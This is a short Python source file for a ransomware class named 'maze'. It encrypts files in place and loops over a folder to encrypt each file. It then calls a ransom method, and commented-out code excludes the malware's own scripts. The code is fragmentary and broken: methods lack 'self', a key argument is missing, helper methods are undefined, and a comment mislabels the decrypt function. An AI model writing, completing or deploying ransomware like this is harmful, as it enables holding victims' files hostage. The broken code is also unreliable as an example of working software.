import os
import sys
import logging
from encrypt import *
from decrypt import *


# Ransomware class

class maze:

    # Encrypt files
    def encrypt_file(key, filename):

        # Load the content of file
        with open(filename, 'r') as file:
            content = file.read()

        # Encrypt data
        encrypted_data = encrypt(content, key)

        # Rewrite the encrypted data in file
        with open(filename, 'w') as file:
            file.write(encrypted_data.decode('utf-8'))


    # Encrypt files
    def decrypt_file(key, filename):

        # Load the content of file
        with open(filename, 'r') as file:
            content = file.read()

        # Decrypt data
        decrypted_data = decrypt(content, key)

        # Rewrite the decrypted data in file
        with open(filename, 'w') as file:
            content = file.write(decrypted_data.decode('utf-8'))


    # List of files in folder
    def encrypt_files_in_folder(self, path):
        
        num_encrypted_files = 0
        files = self.get_files_in_folder(path)

        # Encrypt each file in the directory.
        for file in files:
            logging.debug('Encrypting file: {}'.format(file))
            self.encrypt_file(file)
            num_encrypted_files += 1

        self.ransom_user()

        return num_encrypted_files


# malware_files = ["maze.py", "encrypt.py", "decrypt.py"]
# files = []

# for file in os.listdir():
#     if file in malware_files:
#         continue

#     if os.path.isfile(file):
#         file.append(file)   
